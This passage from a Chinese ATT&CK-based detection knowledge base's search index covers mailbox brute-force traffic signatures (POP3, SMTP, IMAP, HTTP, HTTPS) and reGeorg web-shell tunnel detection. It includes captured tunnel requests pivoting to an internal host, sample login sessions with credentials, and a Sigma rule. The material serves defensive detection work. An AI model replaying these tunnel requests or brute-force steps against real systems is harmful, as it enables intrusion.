u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c \u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_1","text":"\u672c\u6587\u6848\u4f8b\u4e3b\u8981\u53c2\u8003\u3001\u6458\u5f55\u81ea\u300a\u73b0\u573a\u53d6\u8bc1\u4e4b\u6d41\u91cf\u5206\u6790\u603b\u7ed3\u300b\uff0c\u4e0a \u94fe\u63a5","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_2","text":"\u5168\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_3","text":"\u6682\u65e0\uff0c\u67e5\u770b\u6d4b\u8bd5\u6587\u6863\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#pop3","text":"\u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b CAPA //\u7528\u4e8e\u53d6\u5f97\u6b64\u670d\u52a1\u5668\u7684\u529f\u80fd\u9009\u9879\u6e05\u5355 +OK Capability list follows TOP USER PIPELINING EXPIRE NEVER UIDL +OK Mail Server POP3 ready user a1@a.com ---------------------\u8f93\u5165\u7528\u6237\u540d, username \u4e3a\u5177\u4f53\u7684\u7528\u6237\u540d +OK -------------------------------\u6267\u884c\u547d\u4ee4\u6210\u529f pass q1q1q1q1 ---------------------\u8f93\u5165\u7528\u6237\u5bc6\u7801\uff0cpassword \u4e3a\u5177\u4f53\u7684\u5bc6\u7801\uff0c\u8fd9\u91cc\u8981\u6ce8\u610f\uff0c\u5f53\u5bc6\u7801\u8f93\u5165\u9519\u8bef\u540e\u8981\u91cd\u65b0user username\u540e\u518d\u8fd0\u884c\u6b64\u547d\u4ee4\uff0c\u5426\u5219\u63d0\u793a\u547d\u4ee4\u65e0\u6548 +OK 2 messages ---------------------\u5bc6\u7801\u8ba4\u8bc1\u901a\u8fc7 (-ERR authorization failed ---------\u5bc6\u7801\u8ba4\u8bc1\u5931\u8d25) (+OK User successfully logged on. --\u8ba4\u8bc1\u6210\u529f) stat -------------------------------\u90ae\u7bb1\u72b6\u6001 +OK 2 6415 -------------------------2 \u4e3a\u8be5\u4fe1\u7bb1\u603b\u90ae\u4ef6\u6570\uff0c6415 \u4e3a\u603b\u5b57\u8282\u6570 list -------------------------------\u5217\u51fa\u6bcf\u5c01\u90ae\u4ef6\u7684\u5b57\u8282\u6570 +OK --------------------------------\u6267\u884c\u547d\u4ee4\u6210\u529f\uff0c\u5f00\u59cb\u663e\u793a\uff0c\u5de6\u8fb9\u4e3a\u90ae\u4ef6\u7684\u5e8f\u53f7\uff0c\u53f3\u8fb9\u4e3a\u8be5\u90ae\u4ef6\u7684\u5927\u5c0f 1 537 ------------------------------\u7b2c 1 \u5c01\u90ae\u4ef6\uff0c\u5927\u5c0f\u4e3a 537 \u5b57\u8282 2 5878 -----------------------------\u7b2c 2 \u5c01\u90ae\u4ef6\uff0c\u5927\u5c0f\u4e3a 5878 \u5b57\u8282 +OK Microsoft Exchange Server 2003 POP3 .......... 6.5.6944.0 .......... \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u653b\u51fb\u8005\u4e0d\u65ad\u8f93\u5165\u7528\u6237\u540djufeng001\uff0c\u4e0d\u540c\u7684\u5bc6\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u670d\u52a1\u5668\u4e5f\u5927\u91cf\u62a5\u9519\uff1a-ERR Logon failure: unknown user name or bad password\u3002","title":"POP3\u534f\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#smtp","text":"\u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b\uff1a 220 a-ba21a05129e24.test.org Microsoft ESMTP MAIL Service, Version: 6.0.3790.3959 ready at Thu, 6 Aug 2015 11:10:17 +0800 //\u670d\u52a1\u5c31\u7eea EHLO Mr.RightPC //\u4e3b\u673a\u540d 250-a-ba21a05129e24.test.org Hello [192.1.14.228] \u2026\u2026 250 OK AUTH LOGIN // \u8ba4\u8bc1\u5f00\u59cb 334 VXNlcm5hbWU6 // Username: cGFzc0AxMjM= // \u8f93\u5165\u7528\u6237\u540d\u7684base64\u7f16\u7801 334 UGFzc3dvcmQ6 // Password: MXFhekBXU1g= // \u8f93\u5165\u5bc6\u7801\u7684base64\u7f16\u7801 235 2.7.0 Authentication successful. //\u8ba4\u8bc1\u6210\u529f \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u653b\u51fb\u8005\u4e0d\u65ad\u8f93\u5165\u7528\u6237\u540djufeng001\uff0c\u4e0d\u540c\u7684\u5bc6\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u670d\u52a1\u5668\u4e5f\u5927\u91cf\u62a5\u9519\uff1a535 5.7.3 Authentication unsuccessful\u3002","title":"SMTP\u534f\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#imap","text":"\u534f\u8bae\u8ba4\u8bc1\u8fc7\u7a0b\uff1a bf8p CAPABILITY * CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN bf8p OK CAPABILITY completed. s3yg LOGIN \"administrator\" \"1qaz@WSX\" //\u8f93\u5165\u7528\u6237\u540d:administrator\uff0c\u5bc6\u7801:1qaz@WSX s3yg OK LOGIN completed. //\u8ba4\u8bc1\u6210\u529f \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a IMAP\u7206\u7834\u4f1a\u4e0d\u65ad\u91cd\u590dLOGIN \"\u7528\u6237\u540d\" \"\u5bc6\u7801\"\uff0c\u4ee5\u53ca\u767b\u5f55\u5931\u8d25\u7684\u62a5\u9519\uff1aNO Logon failure: unknown user name or bad password\u3002","title":"IMAP\u534f\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#http","text":"HTTP\u767b\u5f55\u9875\u9762\u770b\u662f\u5426\u5b58\u5728302\u9875\u9762\u8df3\u8f6c\u5224\u65ad\u4e3a\u767b\u5f55\u6210\u529f\u3002 Referer: http://192.1.14.199:8080/login.html //\u767b\u5f55\u5730\u5740 uname=admin&upass=1qaz%40WSXHTTP/1.1 200 OK \u2026 <script>alert('OK')</script> //\u8f93\u5165\u7528\u6237\u540dadmin\uff0c\u5bc6\u78011qaz%40WSX\uff0cWeb\u670d\u52a1\u5668\u8fd4\u56deHTTP/1.1 200\u548c\u5f39\u51fa\u5bf9\u8bdd\u6846\u201cOK\u201d\u8868\u793a\u8ba4\u8bc1\u6210\u529f\u3002 \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u77ed\u65f6\u95f4\u5185\u51fa\u73b0\u5927\u91cf\u767b\u5f55\u9875\u9762\u7684\u8bf7\u6c42\u5305\u3002","title":"HTTP\u534f\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#https","text":"HTTPS\u534f\u8bae\u4e3a\u52a0\u5bc6\u534f\u8bae\uff0c\u4ece\u6570\u636e\u5f88\u96be\u5224\u65ad\u8ba4\u8bc1\u662f\u5426\u6210\u529f\uff0c\u53ea\u80fd\u6839\u636e\u6570\u636e\u5934\u90e8\u7ed3\u5408\u793e\u4f1a\u5de5\u7a0b\u5b66\u624d\u80fd\u5224\u65ad\u3002\u5982\u8ba4\u8bc1\u540e\u6709\u65e0\u67e5\u770b\u7f51\u9875\u3001\u90ae\u4ef6\u7684\u6b65\u9aa4\uff0c\u5982\u6709\uff0c\u5c31\u4f1a\u4ea7\u751f\u52a0\u5bc6\u6570\u636e\u3002 \u66b4\u529b\u7834\u89e3\u7279\u5f81\uff1a \u7206\u7834\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u65ad\u51fa\u73b0\u8ba4\u8bc1\u8fc7\u7a0b\uff1a\u201cClient Hello\u201d\u3001\u201cServer Hello\u201d\u7b49\uff0c\u5e76\u672a\u51fa\u73b0\u767b\u5f55\u6210\u529f\u540e\u64cd\u4f5c\u7684\u5927\u91cf\u52a0\u5bc6\u6570\u636e\u3002\u5728\u4e0d\u52302\u79d2\u7684\u65f6\u95f4\u5c31\u51fa\u73b016\u6b21\u8ba4\u8bc1\uff0c\u57fa\u672c\u53ef\u4ee5\u5224\u65ad\u4e3a\u66b4\u529b\u7834\u89e3\u3002","title":"HTTPS\u534f\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-%E9%82%AE%E7%AE%B1%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/#_6","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ \u73b0\u573a\u53d6\u8bc1\u4e4b\u6d41\u91cf\u5206\u6790\u603b\u7ed3 https://my.oschina.net/u/4395026/blog/3783867","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/","text":"T1505-003-Regeorg-HTTP\u96a7\u9053\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49) ReGeorg\u7b80\u4ecb reGeorg\u662freDuh\u7684\u7ee7\u627f\u8005\uff0c\u5229\u7528\u4e86\u4f1a\u8bdd\u5c42\u7684socks5\u534f\u8bae\uff0c\u6548\u7387\u66f4\u9ad8\u7ed3\u5408Proxifier\u4f7f\u7528\uff1bProxifier\u662f\u4e00\u6b3e\u529f\u80fd\u975e\u5e38\u5f3a\u5927\u7684socks5\u5ba2\u6237\u7aef\uff0c\u53ef\u4ee5\u8ba9\u4e0d\u652f\u6301\u901a\u8fc7\u4ee3\u7406\u670d\u52a1\u5668\u5de5\u4f5c\u7684\u7f51\u7edc\u7a0b\u5e8f\u80fd\u901a\u8fc7HTTPS\u6216SOCKS\u4ee3\u7406\u6216\u4ee3\u7406\u94fe\u3002 \u6d4b\u8bd5\u6848\u4f8b reGeorg\u642d\u5efaHTTP\u96a7\u9053\u548c\u6d41\u91cf\u5206\u6790 https://cloud.tencent.com/developer/article/1779195 \u68c0\u6d4b\u65e5\u5fd7 HTTP_log \u6d4b\u8bd5\u590d\u73b0 \u53c2\u8003\u6d4b\u8bd5\u6848\u4f8b\u6587\u7ae0\u94fe\u63a5 \u6d4b\u8bd5\u7559\u75d5 kali \u5728kali\u4e0a\u6293\u5305\uff0c\u7136\u540e\u8bbf\u95ee\u5185\u7f51\uff0ctcpdump\u6293\u5305\uff0c\u5206\u6790\u6d41\u91cf tcpdump -ieth0 -wkali.pcap \u7136\u540e\u6253\u5f00wireshark\u8ffd\u8e2atcp\u6d41\uff0c\u770b\u6d41\u91cf ...............P.........PGET /login.php HTTP/1.1 Host: 172.17.0.2 User-Agent: curl/7.68.0 Accept: */* HTTP/1.1 200 OK Date: Thu, 17 Dec 2020 16:39:09 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9-1ubuntu4.25 Set-Cookie: PHPSESSID=7mhcg05sbeerpgjvthqad6r7t6; path=/ Expires: Tue, 23 Jun 2009 12:00:00 GMT Cache-Control: no-cache, must-revalidate Pragma: no-cache Set-Cookie: PHPSESSID=7mhcg05sbeerpgjvthqad6r7t6; path=/; httponly Set-Cookie: security=impossible; httponly Vary: Accept-Encoding Content-Length: 1567 Content-Type: text/html;charset=utf-8 <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> serverA \u5728serverA\u4e0a\u6293\u5305\u7b2c\u4e00\u4e2a\u6d41\u53ef\u4ee5\u770b\u5230\u670d\u52a1\u5668A\u4f5c\u4e3a\u8df3\u677f\uff0c\u8868\u660e\u670d\u52a1\u5668\u4e0e\u54ea\u53f0\u5185\u7f51\u4e3b\u673a\u7684\u54ea\u4e2a\u7aef\u53e3\u8fde\u63a5cmd=connecttarget=172.17.0.2 \u76ee\u6807\u5185\u7f51ipport=80 \u7aef\u53e3\u4e3a80 POST http://182.x.x.x:8080/tunnel.jsp? cmd=connect&target=172.17.0.2&port=80 HTTP/1.1 Host: 182.x.x.x:8080 Accept-Encoding: identity Content-Length: 0 X-CMD: CONNECT X-PORT: 80 X-TARGET: 172.17.0.2 User-Agent: python-urllib3/1.26.2 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Set-Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly X-STATUS: OK Content-Type: text/html Content-Length: 0 Date: Thu, 17 Dec 2020 16:44:45 GMT \u4e0b\u4e00\u6761\u6d41cmd=read,\u4ee3\u8868\u662f\u53bb\u8bbf\u95ee\u5185\u7f51\u7684\u5185\u5bb9 Accept-Encoding: identity\u8bf7\u6c42\u7684HTTP\u5934\u901a\u544a\u5176\u5185\u5bb9\u7f16\u7801\uff0c\u53ea\u8981\u6ca1\u6709\u88ab\u660e\u786e\u7981\u6b62 \u670d\u52a1\u5668\u5c31\u4e0d\u80fd\u53d1\u56de406 Not Acceptable\u9519\u8bef \u54cd\u5e94\u5305\u5934\uff1aTransfer-Encoding: chunked\u4ee3\u8868\u662f\u5206\u5757\u4f20\u8f93 POST /tunnel.jsp?cmd=read HTTP/1.1 Host: 182.x.x.x:8080 Accept-Encoding: identity Content-Length: 0 X-CMD: READ Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly Connection: Keep-Alive User-Agent: python-urllib3/1.26.2 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 X-STATUS: OK Content-Type: text/html Transfer-Encoding: chunked Date: Thu, 17 Dec 2020 16:44:45 GMT \u63a5\u4e0b\u6765\u8fd9\u6761\u6d41\u5c31\u662fcmd=forward\uff0c\u8f6c\u53d1\u5230\u5185\u7f51 POST /tunnel.jsp?cmd=forward HTTP/1.1 Host: 182.92.73.106:8080 Accept-Encoding: identity Content-Length: 83 Content-Type: application/octet-stream X-CMD: FORWARD Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly Connection: Keep-Alive User-Agent: python-urllib3/1.26.2 GET /login.php HTTP/1.1 Host: 172.17.0.2 User-Agent: curl/7.68.0 Accept: */* HTTP/1.1 200 OK Server: Apache-Coyote/1.1 X-STATUS: OK Content-Type: text/html Content-Length: 0 Date: Thu, 17 Dec 2020 16:44:45 GMT \u6700\u540e\u5c31\u662fcmd=disconnect\u5173\u95ed\u8fde\u63a5 POST /tunnel.jsp?cmd=disconnect HTTP/1.1 Host: 182.x.x.x:8080 Accept-Encoding: identity X-CMD: DISCONNECT Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly User-Agent: python-urllib3/1.26.2 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 X-STATUS: OK Content-Type: text/html Content-Length: 0 Date: Thu, 17 Dec 2020 16:44:45 GMT \u5185\u7f51\u670d\u52a1\u5668 \u5728\u5185\u7f51\u670d\u52a1\u5668\u4e0a\u6293\u5305,\u770b\u5230\u670d\u52a1\u5668A\u5411\u5185\u7f51\u8bf7\u6c42\u4e86login.php GET /login.php HTTP/1.1 Host: 172.17.0.2 User-Agent: curl/7.68.0 Accept: */* HTTP/1.1 200 OK Date: Thu, 17 Dec 2020 16:53:17 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9-1ubuntu4.25 Set-Cookie: PHPSESSID=65ehap87lgj2sk84poopt0aep3; path=/ Expires: Tue, 23 Jun 2009 12:00:00 GMT Cache-Control: no-cache, must-revalidate Pragma: no-cache Set-Cookie: PHPSESSID=65ehap87lgj2sk84poopt0aep3; path=/; httponly Set-Cookie: security=impossible; httponly Vary: Accept-Encoding Content-Length: 1567 Content-Type: text/html;charset=utf-8 <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> \u4ee5\u4e0a\u5185\u5bb9\u6458\u81ea https://cloud.tencent.com/developer/article/1779195 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Webshell ReGeorg HTTP\u96a7\u9053\u68c0\u6d4b status: \u6d4b\u8bd5\u72b6\u6001 description: \u901a\u8fc7\u8bf7\u6c42\u8def\u5f84\u5185\u7684\u5185\u5bb9\u8fdb\u884c\u68c0\u6d4b\uff0c\u57fa\u4e8eurl\u53c2\u6570\u68c0\u6d4b references: - https://cloud.tencent.com/developer/article/1779195 - https://github.com/sensepost/reGeorg logsource: category: webserver detection: selection: uri_query|contains: #url\u4e2d\u5305\u542b\u6b64\u7c7b\u7279\u5f81 - '*cmd=read*' - '*connect&target*' - '*cmd=connect*' - '*cmd=disconnect*' - '*cmd=forward*' filter: referer: null useragent: null method: POST condition: selection and filter fields: - uri_query - referer - method - useragent falsepositives: - web applications that use the same URL parameters as ReGeorg level: high tags: - attack.persistence - attack.t1100 - attack.t1505.003 \u5907\u6ce8 \u591a\u6570\u5b89\u5168\u8bbe\u5907\u5df2\u652f\u6301\u68c0\u6d4b\u6b64\u7c7b\u96a7\u9053\u884c\u4e3a\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ reGeorg\u642d\u5efaHTTP\u96a7\u9053\u548c\u6d41\u91cf\u5206\u6790 https://cloud.tencent.com/developer/article/1779195","title":"T1505-003-Regeorg-HTTP\u96a7\u9053\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#t1505-003-regeorg-http","text":"","title":"T1505-003-Regeorg-HTTP\u96a7\u9053\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49)","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#regeorg","text":"reGeorg\u662freDuh\u7684\u7ee7\u627f\u8005\uff0c\u5229\u7528\u4e86\u4f1a\u8bdd\u5c42\u7684socks5\u534f\u8bae\uff0c\u6548\u7387\u66f4\u9ad8\u7ed3\u5408Proxifier\u4f7f\u7528\uff1bProxifier\u662f\u4e00\u6b3e\u529f\u80fd\u975e\u5e38\u5f3a\u5927\u7684socks5\u5ba2\u6237\u7aef\uff0c\u53ef\u4ee5\u8ba9\u4e0d\u652f\u6301\u901a\u8fc7\u4ee3\u7406\u670d\u52a1\u5668\u5de5\u4f5c\u7684\u7f51\u7edc\u7a0b\u5e8f\u80fd\u901a\u8fc7HTTPS\u6216SOCKS\u4ee3\u7406\u6216\u4ee3\u7406\u94fe\u3002","title":"ReGeorg\u7b80\u4ecb"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_1","text":"reGeorg\u642d\u5efaHTTP\u96a7\u9053\u548c\u6d41\u91cf\u5206\u6790 https://cloud.tencent.com/developer/article/1779195","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_2","text":"HTTP_log","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_3","text":"\u53c2\u8003\u6d4b\u8bd5\u6848\u4f8b\u6587\u7ae0\u94fe\u63a5","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_4","text":"kali \u5728kali\u4e0a\u6293\u5305\uff0c\u7136\u540e\u8bbf\u95ee\u5185\u7f51\uff0ctcpdump\u6293\u5305\uff0c\u5206\u6790\u6d41\u91cf tcpdump -ieth0 -wkali.pcap \u7136\u540e\u6253\u5f00wireshark\u8ffd\u8e2atcp\u6d41\uff0c\u770b\u6d41\u91cf ...............P.........PGET /login.php HTTP/1.1 Host: 172.17.0.2 User-Agent: curl/7.68.0 Accept: */* HTTP/1.1 200 OK Date: Thu, 17 Dec 2020 16:39:09 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9-1ubuntu4.25 Set-Cookie: PHPSESSID=7mhcg05sbeerpgjvthqad6r7t6; path=/ Expires: Tue, 23 Jun 2009 12:00:00 GMT Cache-Control: no-cache, must-revalidate Pragma: no-cache Set-Cookie: PHPSESSID=7mhcg05sbeerpgjvthqad6r7t6; path=/; httponly Set-Cookie: security=impossible; httponly Vary: Accept-Encoding Content-Length: 1567 Content-Type: text/html;charset=utf-8 <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> serverA \u5728serverA\u4e0a\u6293\u5305\u7b2c\u4e00\u4e2a\u6d41\u53ef\u4ee5\u770b\u5230\u670d\u52a1\u5668A\u4f5c\u4e3a\u8df3\u677f\uff0c\u8868\u660e\u670d\u52a1\u5668\u4e0e\u54ea\u53f0\u5185\u7f51\u4e3b\u673a\u7684\u54ea\u4e2a\u7aef\u53e3\u8fde\u63a5cmd=connecttarget=172.17.0.2 \u76ee\u6807\u5185\u7f51ipport=80 \u7aef\u53e3\u4e3a80 POST http://182.x.x.x:8080/tunnel.jsp? cmd=connect&target=172.17.0.2&port=80 HTTP/1.1 Host: 182.x.x.x:8080 Accept-Encoding: identity Content-Length: 0 X-CMD: CONNECT X-PORT: 80 X-TARGET: 172.17.0.2 User-Agent: python-urllib3/1.26.2 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Set-Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; 